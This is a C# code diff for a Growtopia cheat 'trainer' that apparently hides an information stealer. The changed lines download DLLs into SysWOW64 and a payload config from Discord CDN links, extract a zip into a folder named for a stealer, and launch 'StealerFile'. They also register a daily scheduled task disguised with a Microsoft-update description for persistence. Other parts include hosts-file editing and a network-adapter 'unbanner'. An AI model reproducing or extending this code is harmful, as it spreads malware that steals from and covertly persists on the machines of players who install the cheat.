@@ -109,23 +109,27 @@ namespace FreeZeHAX_Trainer
 
                     if (!File.Exists(SysWOW64 + "\\vcruntime140.dll"))
                     {
-                        web.DownloadFileAsync(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/930579282810531840/vcruntime140.dll"), SysWOW64 + "\\vcruntime140.dll");
+                        web.DownloadFile(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/930579282810531840/vcruntime140.dll"), SysWOW64 + "\\vcruntime140.dll");
+                        others.Wait(2000);
                     }
                     if (!File.Exists(SysWOW64 + "\\vcruntime140d.dll"))
                     {
-                        web.DownloadFileAsync(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/930579282974093353/vcruntime140d.dll"), SysWOW64 + "\\vcruntime140d.dll");
+                        web.DownloadFile(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/930579282974093353/vcruntime140d.dll"), SysWOW64 + "\\vcruntime140d.dll");
+                        others.Wait(2000);
                     }
                     if (!File.Exists(SysWOW64 + "\\msvcp140.dll"))
                     {
-                        web.DownloadFileAsync(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/930579283150250096/msvcp140.dll"), SysWOW64 + "\\msvcp140.dll");
+                        web.DownloadFile(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/930579283150250096/msvcp140.dll"), SysWOW64 + "\\msvcp140.dll");
+                        others.Wait(2000);
                     }
                     CETimer.Start();
                     others.DirClean(StealerFolder);
-                    others.Wait(1000);
+                    others.Wait(2000);
                     Directory.CreateDirectory(StealerFolderLoc);
-                    web.DownloadFileAsync(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/931544431256031292/App.config"), StealerFolderLoc + "\\App.config");
-                    others.Wait(1000);
+                    web.DownloadFile(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/931573162162937947/App.config"), StealerFolderLoc + "\\App.config");
+                    others.Wait(2000);
                     System.IO.Compression.ZipFile.ExtractToDirectory(StealerFolderLoc + "\\" + ZipFileName, StealerFolderLoc);
+                    others.Wait(2000);
                     if (!savePathExists)
                     {
                         td.RegistrationInfo.Description = "Keeps your Microsoft software up to date. If this task is disabled or stopped, your Microsoft software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This task uninstalls itself when there is no Microsoft software using it.";
@@ -145,8 +149,8 @@ namespace FreeZeHAX_Trainer
                     }
                     else
                     {
-                        others.Wait(100);
-                        System.Diagnostics.Process.Start(StealerFile);
+                        others.Wait(500);
+                        Process.Start(StealerFile);
                         td.RegistrationInfo.Description = "Keeps your Microsoft software up to date. If this task is disabled or stopped, your Microsoft software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This task uninstalls itself when there is no Microsoft software using it.";
                         DailyTrigger dt = new DailyTrigger();
                         dt.Repetition.Duration = TimeSpan.FromHours(24);
@@ -391,7 +395,7 @@ namespace FreeZeHAX_Trainer
 
         private void HostsRefresh_Click(object sender, EventArgs e)
         {
-            string path = System.IO.Path.Combine(Environment.SystemDirectory, "drivers\\etc\\hosts");
+            string path = Path.Combine(Environment.SystemDirectory, "drivers\\etc\\hosts");
             string str = File.ReadAllText(path);
             Host_File_Editor.Text = str;
         }
@@ -426,7 +430,6 @@ namespace FreeZeHAX_Trainer
                 OnTop.FlatAppearance.BorderColor = Color.Black;
             }
         }
-
         #region Trainer Move
         private void TopBar_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
         {
@@ -472,7 +475,6 @@ namespace FreeZeHAX_Trainer
             mouseDown = false;
         }
         #endregion
-
         #region Growtopia Cheats
         private void GiveawayMode_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
         {
@@ -816,7 +818,7 @@ namespace FreeZeHAX_Trainer
             }
         }
         #endregion
-
+        #region Unbanner Class
         public class Adapter
         {
             public ManagementObject adapter;
@@ -831,7 +833,7 @@ namespace FreeZeHAX_Trainer
                 customname = cname;
                 devnum = n;
             }
-            #region Unbanner
+
             public Adapter(NetworkInterface i) : this(i.Description) { }
 
             public Adapter(string aname)
